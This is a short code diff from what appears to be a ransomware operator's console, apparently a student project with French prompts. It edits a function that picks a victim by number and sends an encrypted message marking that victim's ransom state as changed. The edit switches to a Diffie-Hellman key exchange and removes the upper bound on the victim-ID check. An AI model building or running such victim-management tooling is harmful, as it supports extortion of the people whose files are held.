@@ -96,19 +96,19 @@ def victim_history(client_socket, v_list):
 
 
 def ransom_payment(client_socket, v_list):
-    global key
-
+    key = security.diffie_hellman_recv_key(client_socket)
     if not v_list:
         print("Listez les victimes avant !")
         return
     v_id = 0
-    while not (1 <= v_id < len(v_list)):
+    while not (1 <= v_id):
         v_id = int(input("Numéro de la victime ? "))
-        if not (1 <= v_id < len(v_list)):
+        if not (1 <= v_id):
             print("ID invalide ! ")
     message = utile.message.set_message('change_state', [v_id])
     message_chiffrer = security.aes_encrypt(message, key)
     network.send_message(client_socket, message_chiffrer)
+    print(str(message))
 
 
 def print_victims_listing(client_socket):
